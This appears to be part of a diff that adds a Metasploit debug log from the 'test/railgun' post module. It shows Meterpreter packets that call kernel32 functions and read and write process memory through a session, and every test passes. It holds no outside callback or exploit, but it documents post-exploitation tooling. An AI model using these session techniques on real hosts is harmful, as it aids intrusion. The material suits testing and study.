+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1029 command=stdapi_railgun_api_multi>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="30618552047136289337846722605130">
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073761835 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151073  meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282146  meta=RAW        value="\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282147  meta=RAW        value="kernel32.dll\x00\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282148  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85545   meta=STRING     value="kernel32">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85546   meta=STRING     value="LoadLibraryA">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85551   meta=STRING     value="stdcall">
+]>
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073761835 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151073  meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282146  meta=RAW        value="\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282147  meta=RAW        value="kernel32.dll\x00\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282148  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85545   meta=STRING     value="kernel32">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85546   meta=STRING     value="GetModuleHandleA">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85551   meta=STRING     value="stdcall">
+]>
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073761835 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151073  meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282146  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282147  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282148  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85545   meta=STRING     value="kernel32">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85546   meta=STRING     value="GetCurrentProcessId">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85551   meta=STRING     value="stdcall">
+]>
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1029 command=stdapi_railgun_api_multi>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value=";:\v\xE1\x98\x13\x04\x97\xD8\xE5\xCD\xF1\xBA\xE5\ ...">
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073761835 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151080  meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85552   meta=STRING     value="The operation completed successfully.">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-1068583 meta=QWORD      value=140732078882816>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282149  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282150  meta=RAW        value="">
+]>
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073761835 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151080  meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85552   meta=STRING     value="The operation completed successfully.">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-1068583 meta=QWORD      value=140732078882816>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282149  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282150  meta=RAW        value="">
+]>
+  #<Rex::Post::Meterpreter::GroupTlv type=unknown-1073761835 tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151080  meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85552   meta=STRING     value="The operation completed successfully.">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-1068583 meta=QWORD      value=3056>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282149  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282150  meta=RAW        value="">
+]>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="30618552047136289337846722605130">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1072 command=stdapi_sys_process_getpid>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="17011185252933025060302222140442">
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1072 command=stdapi_sys_process_getpid>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value=";:\v\xE1\x98\x13\x04\x97\xD8\xE5\xCD\xF1\xBA\xE5\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-133372  meta=INT        value=3056>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="17011185252933025060302222140442">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+]>
+before running test: Should support calling multiple functions at once
+[+] Should support calling multiple functions at once
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1028 command=stdapi_railgun_api>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="92495834146405193203860726231921">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151073  meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282146  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282147  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282148  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85545   meta=STRING     value="kernel32">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85546   meta=STRING     value="GetProcessHeap">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85551   meta=STRING     value="stdcall">
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1028 command=stdapi_railgun_api>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value=";:\v\xE1\x98\x13\x04\x97\xD8\xE5\xCD\xF1\xBA\xE5\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151080  meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85552   meta=STRING     value="The operation completed successfully.">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-1068583 meta=QWORD      value=1484051775488>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282149  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282150  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="92495834146405193203860726231921">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1028 command=stdapi_railgun_api>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="42214313206677217181506547785836">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151073  meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282146  meta=RAW        value="\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00a\x88Y\x0 ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282147  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282148  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85545   meta=STRING     value="kernel32">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85546   meta=STRING     value="HeapAlloc">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85551   meta=STRING     value="stdcall">
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1028 command=stdapi_railgun_api>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value=";:\v\xE1\x98\x13\x04\x97\xD8\xE5\xCD\xF1\xBA\xE5\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151080  meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85552   meta=STRING     value="The operation completed successfully.">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-1068583 meta=QWORD      value=1484051899552>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282149  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282150  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="42214313206677217181506547785836">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1031 command=stdapi_railgun_memwrite>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="06144245554227578317592263545596">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-1068588 meta=QWORD      value=1484051899552>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282157  meta=RAW        value="78AGc3ndTdceZwt2M9G7mJbg7YxLcEZp">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151086  meta=INT        value=32>
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1031 command=stdapi_railgun_memwrite>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value=";:\v\xE1\x98\x13\x04\x97\xD8\xE5\xCD\xF1\xBA\xE5\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="06144245554227578317592263545596">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1030 command=stdapi_railgun_memread>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="67322320038189915473062476112727">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-1068588 meta=QWORD      value=1484051899552>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151086  meta=INT        value=32>
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1030 command=stdapi_railgun_memread>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value=";:\v\xE1\x98\x13\x04\x97\xD8\xE5\xCD\xF1\xBA\xE5\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282157  meta=RAW        value="78AGc3ndTdceZwt2M9G7mJbg7YxLcEZp">
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="67322320038189915473062476112727">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1028 command=stdapi_railgun_api>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="13699703568842180182930284474675">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151073  meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282146  meta=RAW        value="\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00a\x88Y\x0 ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282147  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282148  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85545   meta=STRING     value="kernel32">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85546   meta=STRING     value="HeapFree">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85551   meta=STRING     value="stdcall">
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1028 command=stdapi_railgun_api>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value=";:\v\xE1\x98\x13\x04\x97\xD8\xE5\xCD\xF1\xBA\xE5\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151080  meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85552   meta=STRING     value="The operation completed successfully.">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-1068583 meta=QWORD      value=1>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282149  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282150  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="13699703568842180182930284474675">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+]>
+before running test: Should support writing memory
+[+] Should support writing memory
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1028 command=stdapi_railgun_api>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="04820421166593045646504071424600">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151073  meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282146  meta=RAW        value="\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282147  meta=RAW        value="kernel32\x00\x00\x00\x00\x00\x00\x00\x00">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282148  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85545   meta=STRING     value="kernel32">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85546   meta=STRING     value="GetModuleHandleA">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85551   meta=STRING     value="stdcall">
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1028 command=stdapi_railgun_api>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value=";:\v\xE1\x98\x13\x04\x97\xD8\xE5\xCD\xF1\xBA\xE5\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151080  meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-85552   meta=STRING     value="The operation completed successfully.">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-1068583 meta=QWORD      value=140732078882816>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282149  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282150  meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="04820421166593045646504071424600">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1030 command=stdapi_railgun_memread>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="81288027347749970560261570191993">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-1068588 meta=QWORD      value=140732078882816>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-151086  meta=INT        value=4>
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1030 command=stdapi_railgun_memread>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value=";:\v\xE1\x98\x13\x04\x97\xD8\xE5\xCD\xF1\xBA\xE5\ ...">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-282157  meta=RAW        value="MZ\x90\x00">
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="81288027347749970560261570191993">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+]>
+before running test: Should support reading memory
+[+] Should support reading memory
+[*] Testing complete in 0.6502041
+[*] Passed: 8; Failed: 0
+[*] Post module execution completed
+msf6 post(test/railgun) > 
